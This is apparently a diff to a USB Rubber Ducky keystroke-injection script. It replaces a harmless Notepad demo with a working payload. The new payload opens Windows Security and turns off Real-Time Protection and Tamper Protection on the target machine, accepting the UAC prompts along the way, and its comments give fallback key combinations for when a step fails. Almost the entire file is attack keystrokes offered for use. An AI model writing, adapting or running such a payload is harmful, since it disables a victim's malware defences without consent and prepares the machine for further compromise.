@@ -1,5 +1,7 @@
-REM  MY FIRST DUCKY SCRIPT
-REM 
+REM Turn off Windows Real-Time Protection and Tamper Protection
+DELAY 1000
+REM
+REM
 REM ┏━━━┓╋╋╋╋╋┏┓╋╋╋╋╋╋╋┏┓╋╋╋╋╋┏┓
 REM ┃┏━━┛╋╋╋╋╋┃┃╋╋╋╋╋╋╋┃┃╋╋╋╋╋┃┃
 REM ┃┗━━┳┓┏┳━┓┃┃┏┳┓╋┏┓╋┃┣┓┏┳━┓┃┃┏┳┓╋┏┓
@@ -8,13 +10,37 @@ REM ┃┃╋╋┃┗┛┃┃┃┃┏┓┫┗━┛┃┗┛┃┗┛┃┃�
 REM ┗┛╋╋┗━━┻┛┗┻┛┗┻━┓┏┻━━┻━━┻┛┗┻┛┗┻━┓┏┛
 REM ╋╋╋╋╋╋╋╋╋╋╋╋╋┏━┛┃╋╋╋╋╋╋╋╋╋╋╋╋┏━┛┃
 REM ╋╋╋╋╋╋╋╋╋╋╋╋╋┗━━┛╋╋╋╋╋╋╋╋╋╋╋╋┗━━┛
-REM
-REM
-REM Open Notepad and write something:
-DELAY 1000
 GUI r
-DELAY 100
-STRING notepad
+DELAY 200
+STRING WindowsDefender:
+DELAY 400
 ENTER
-DELAY 1000 
-STRING You have been hacked noob 
+REM Open Windows Security Settings
+DELAY 800
+ENTER
+REM Open Virus and Threat Protection 
+DELAY 800
+TAB
+TAB
+TAB
+TAB
+ENTER
+REM Virus and Threat Protection > Manage Settings
+DELAY 400
+REM Disable Real-Time Protection
+SPACE
+ALT y
+REM Accept UAC Prompt -- If doesn't work use "ALT o" instead
+TAB
+TAB
+TAB
+TAB
+REM Disable Tamper Protection
+SPACE
+DELAY 400
+ALT y
+DELAY 200
+ALT y 
+REM Accept UAC Prompt -- If doesn't work use "ALT o" instead
+REM Windows Real-Time Protection and Tamper Protection are now disabled
+
